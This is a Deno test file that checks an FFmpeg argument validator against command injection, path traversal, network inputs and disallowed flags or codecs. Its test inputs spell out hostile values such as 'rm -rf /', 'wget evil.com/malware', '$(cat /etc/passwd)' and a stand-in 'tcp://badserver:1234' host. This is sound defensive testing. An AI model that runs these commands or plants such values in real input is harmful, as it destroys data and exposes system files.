/**
 * @license
 * This file is part of Bott.
 *
 * This project is dual-licensed:
 * - Non-commercial use: AGPLv3 (see LICENSE file for full text).
 * - Commercial use: Proprietary License (contact D@nielLaCos.se for details).
 *
 * Copyright (C) 2025 DanielLaCos.se
 */

import { assertEquals, assertThrows } from "jsr:@std/assert";
import { 
  validateFFmpegArgs, 
  FFmpegSecurityError, 
  buildSafeFFmpegArgs 
} from "./ffmpeg.ts";

Deno.test("validateFFmpegArgs - basic validation", () => {
  // Valid basic args should pass
  const validArgs = ["-i", "{{INPUT_FILE}}", "-y", "-f", "webp", "{{OUTPUT_FILE}}"];
  assertEquals(validateFFmpegArgs(validArgs), validArgs);
});

Deno.test("validateFFmpegArgs - command injection prevention", () => {
  // Shell metacharacters should fail
  assertThrows(
    () => validateFFmpegArgs(["-i", "file.txt; rm -rf /", "-f", "webp"]),
    FFmpegSecurityError,
    "dangerous pattern"
  );
  
  assertThrows(
    () => validateFFmpegArgs(["-i", "file.txt && wget evil.com/malware"]),
    FFmpegSecurityError,
    "dangerous pattern"
  );
  
  assertThrows(
    () => validateFFmpegArgs(["-i", "`rm -rf /`"]),
    FFmpegSecurityError,
    "dangerous pattern"
  );
  
  assertThrows(
    () => validateFFmpegArgs(["-i", "$(cat /etc/passwd)"]),
    FFmpegSecurityError,
    "dangerous pattern"
  );
});

Deno.test("validateFFmpegArgs - flag allowlist", () => {
  // Allowed flags should pass
  const allowedArgs = ["-i", "-y", "-f", "-vf", "-c:v", "-c:a"];
  assertEquals(validateFFmpegArgs(allowedArgs), allowedArgs);
  
  // Disallowed flags should fail
  assertThrows(
    () => validateFFmpegArgs(["-exec", "rm -rf /"]),
    FFmpegSecurityError,
    "not in the allowlist"
  );
  
  assertThrows(
    () => validateFFmpegArgs(["-safe", "0"]),
    FFmpegSecurityError,
    "not in the allowlist"
  );
});

Deno.test("validateFFmpegArgs - dangerous patterns", () => {
  // File system access patterns should fail
  assertThrows(
    () => validateFFmpegArgs(["-i", "/etc/passwd"]),
    FFmpegSecurityError,
    "dangerous pattern"
  );
  
  assertThrows(
    () => validateFFmpegArgs(["-i", "../../../sensitive"]),
    FFmpegSecurityError,
    "dangerous pattern"
  );
  
  // Network access patterns should fail
  assertThrows(
    () => validateFFmpegArgs(["-i", "http://evil.com/malware"]),
    FFmpegSecurityError,
    "dangerous pattern"
  );
  
  assertThrows(
    () => validateFFmpegArgs(["-f", "tcp://badserver:1234"]),
    FFmpegSecurityError,
    "dangerous pattern"
  );
});

Deno.test("validateFFmpegArgs - numeric validation", () => {
  // Valid numeric values should pass
  const validNumeric = ["-t", "30", "-ar", "16000"];
  assertEquals(validateFFmpegArgs(validNumeric), validNumeric);
  
  // Invalid numeric ranges should fail
  assertThrows(
    () => validateFFmpegArgs(["-t", "999999999"]),
    FFmpegSecurityError,
    "out of safe range"
  );
  
  assertThrows(
    () => validateFFmpegArgs(["-ar", "-1"]),
    FFmpegSecurityError,
    "out of safe range"
  );
});

Deno.test("validateFFmpegArgs - codec validation", () => {
  // Allowed codecs should pass
  const validCodecs = ["-c:v", "libwebp", "-c:a", "libopus"];
  assertEquals(validateFFmpegArgs(validCodecs), validCodecs);
  
  // Disallowed codecs should fail
  assertThrows(
    () => validateFFmpegArgs(["-c:v", "libhacktool"]),
    FFmpegSecurityError,
    "codec \"libhacktool\" is not allowed"
  );
});

Deno.test("validateFFmpegArgs - excessive length", () => {
  const longArg = "a".repeat(5000);
  
  assertThrows(
    () => validateFFmpegArgs(["-i", longArg]),
    FFmpegSecurityError,
    "too long"
  );
});

Deno.test("buildSafeFFmpegArgs - template replacement", () => {
  const baseArgs = ["-i", "{{INPUT_FILE}}", "-y", "-f", "webp", "{{OUTPUT_FILE}}"];
  const inputFile = "/tmp/input.jpg";
  const outputFile = "/tmp/output.webp";
  
  const result = buildSafeFFmpegArgs(baseArgs, inputFile, outputFile);
  const expected = ["-i", "/tmp/input.jpg", "-y", "-f", "webp", "/tmp/output.webp"];
  
  assertEquals(result, expected);
});

Deno.test("buildSafeFFmpegArgs - validates base args", () => {
  const dangerousArgs = ["-i", "{{INPUT_FILE}}", "-exec", "rm -rf /"];
  
  assertThrows(
    () => buildSafeFFmpegArgs(dangerousArgs, "input.txt", "output.txt"),
    FFmpegSecurityError,
    "not in the allowlist"
  );
});